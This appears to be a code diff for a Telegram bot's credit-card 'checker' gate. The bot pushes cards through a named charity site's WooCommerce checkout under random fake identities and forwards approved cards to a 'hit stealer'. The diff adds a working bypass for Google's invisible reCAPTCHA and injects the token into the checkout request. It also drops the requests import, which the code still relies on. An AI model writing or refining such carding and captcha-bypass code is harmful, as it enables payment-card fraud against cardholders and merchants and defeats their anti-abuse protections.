@@ -4,7 +4,8 @@ import re
 import os
 import random
 import string
-import requests
+import base64
+import httpx
 from bs4 import BeautifulSoup
 from pyrogram import Client, filters, enums
 from FUNC.usersdb_func import *
@@ -17,6 +18,7 @@ from BOT.tools.hit_stealer import send_hit_if_approved
 # Configuration
 # -------------------------------------------------------------
 GATE_NAME = "Payeezy 10$"
+
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
@@ -83,6 +85,53 @@ def parse_error_response(response_text):
     
     return 'Unknown error İdk Man Chk Site'
 
+# -------------------------------------------------------------
+# reCAPTCHA Solver (async, using httpx)
+# -------------------------------------------------------------
+async def get_recaptcha_token(sitekey: str, target_domain: str) -> str | None:
+    """
+    Attempts to bypass Google's invisible reCAPTCHA v2 to obtain a valid token.
+    """
+    try:
+        co_value = base64.b64encode(target_domain.encode()).decode().rstrip('=')
+        anchor_url = f'https://www.google.com/recaptcha/api2/anchor?ar=1&k={sitekey}&co={co_value}&hl=en&size=invisible'
+        reload_url = f'https://www.google.com/recaptcha/api2/reload?k={sitekey}'
+        
+        async with httpx.AsyncClient(timeout=30, follow_redirects=True) as client:
+            client.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+            })
+            r1 = await client.get(anchor_url)
+            r1.raise_for_status()
+            
+            if 'recaptcha-token' not in r1.text:
+                return None
+            token1 = r1.text.split('recaptcha-token" value="')[1].split('">')[0]
+            
+            payload = (
+                f'v=pCoGBhjs9s8EhFOHJFe8cqis'
+                f'&reason=q'
+                f'&c={token1}'
+                f'&k={sitekey}'
+                f'&co={co_value}'
+                f'&hl=en'
+                f'&size=invisible'
+            )
+            headers = {'content-type': 'application/x-www-form-urlencoded'}
+            r2 = await client.post(reload_url, data=payload, headers=headers)
+            r2.raise_for_status()
+            
+            if '"rresp","' in r2.text:
+                final_token = r2.text.split('"rresp","')[1].split('"')[0]
+                return final_token
+            else:
+                return None
+    except Exception:
+        return None
+
+# -------------------------------------------------------------
+# Core synchronous check (modified to include captcha solving)
+# -------------------------------------------------------------
 def process_card_sync(card_line, site_url, product_url, product_id):
     session = requests.Session()
     
@@ -112,7 +161,6 @@ def process_card_sync(card_line, site_url, product_url, product_id):
         shop_resp = session.get(f"{site_url}/shop/", headers=headers, timeout=10)
         product_resp = session.get(product_url, headers=headers, timeout=10)
         
-        # Extract product ID if needed (already provided, but fallback)
         pid_match = re.search(r'name="add-to-cart"\s+value="(\d+)"', product_resp.text)
         current_product_id = pid_match.group(1) if pid_match else product_id
         
@@ -134,7 +182,6 @@ def process_card_sync(card_line, site_url, product_url, product_id):
         
         # Get cart hash and checkout page
         session.get(f"{site_url}/cart/", headers=headers, timeout=10)
-        cart_hash = session.cookies.get('woocommerce_cart_hash', '')
         checkout_resp = session.get(f"{site_url}/checkout/", headers=headers, timeout=10)
         
         # Extract nonce
@@ -146,6 +193,12 @@ def process_card_sync(card_line, site_url, product_url, product_id):
         # Extract session pages number
         pages_match = re.search(r'wc_order_attribution_session_pages["\']?\s*:\s*(\d+)', checkout_resp.text)
         session_pages = int(pages_match.group(1)) if pages_match else 11
+        
+        # Extract reCAPTCHA sitekey
+        recaptcha_sitekey = None
+        sitekey_match = re.search(r'data-sitekey="([^"]+)"', checkout_resp.text)
+        if sitekey_match:
+            recaptcha_sitekey = sitekey_match.group(1)
         
         # Generate random user info
         first_name, last_name = generate_full_name()
@@ -170,6 +223,7 @@ def process_card_sync(card_line, site_url, product_url, product_id):
             'user-agent': headers['User-Agent'],
             'x-requested-with': 'XMLHttpRequest'
         }
+        
         checkout_data = (
             f'wc_order_attribution_source_type=typein'
             f'&wc_order_attribution_referrer=(none)'
@@ -200,11 +254,23 @@ def process_card_sync(card_line, site_url, product_url, product_id):
             f'&billing_email={email}'
             f'&account_password='
             f'&order_comments='
-            f'&payment_method=stripe'
-            f'&terms-field=1'
+            f'&payment_method=stripe_cc'  # try correct payment method name
+            f'&terms=1'                   # correct terms field
             f'&woocommerce-process-checkout-nonce={checkout_nonce}'
             f'&_wp_http_referer=%2Fcheckout%2F'
         )
+        
+        # If recaptcha sitekey found, solve and add token
+        if recaptcha_sitekey:
+            # We need to run the async solver in a thread because this is sync
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            try:
+                captcha_token = loop.run_until_complete(get_recaptcha_token(recaptcha_sitekey, site_url))
+            finally:
+                loop.close()
+            if captcha_token:
+                checkout_data += f'&g-recaptcha-response={captcha_token}'
         
         checkout_resp = session.post(
             f"{site_url}/?wc-ajax=checkout",
@@ -222,7 +288,6 @@ def process_card_sync(card_line, site_url, product_url, product_id):
         except:
             pass
         
-        # Determine status from error_msg
         if "SUCCESS" in error_msg or "Charged" in error_msg:
             return "Approved ✅", error_msg[:50]
         elif "CAPTCHA" in error_msg or "TERMS" in error_msg:
@@ -254,11 +319,9 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_ta
 # Async wrapper for single card
 # -------------------------------------------------------------
 async def call_payeezy_api(fullcc):
-    # Get site_url and product_url dynamically
     site_url = "https://learntoreadstjohns.org"
     try:
         loop = asyncio.get_running_loop()
-        # First, get product URL (run in thread)
         def get_product_info():
             sess = requests.Session()
             sess.headers.update({
@@ -278,7 +341,6 @@ async def call_payeezy_api(fullcc):
         if not product_url:
             return "Error", "Product not found on site"
         
-        # Process the card
         status, msg = await loop.run_in_executor(None, process_card_sync, fullcc, site_url, product_url, product_id)
         return status, msg
     except Exception as e:
